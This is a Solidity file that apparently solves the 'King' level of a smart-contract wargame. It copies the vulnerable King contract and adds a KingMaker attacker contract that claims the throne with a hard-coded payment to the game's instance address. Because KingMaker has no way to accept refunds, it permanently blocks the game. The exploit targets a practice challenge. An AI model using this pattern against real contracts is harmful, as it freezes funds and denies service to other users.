// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

//compiler that has selfdestruct still working

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingMaker{

    address owner;
    address target= 0x05d15eCBcd730Cc0538DF635Cc76AF12CA645d64; //the instance given by the game


    constructor()payable{
         owner = msg.sender;
    }

    

    function becomeKing(address _target)public{

        _target.call{value:1100000000000000}(""); //can make it cleaner with contract._prize()
    }

    function empty(address _myAddress) public{
        payable(_myAddress).transfer(address(this).balance); //send back the eth received initialy when I'm done with the contract
    }

}

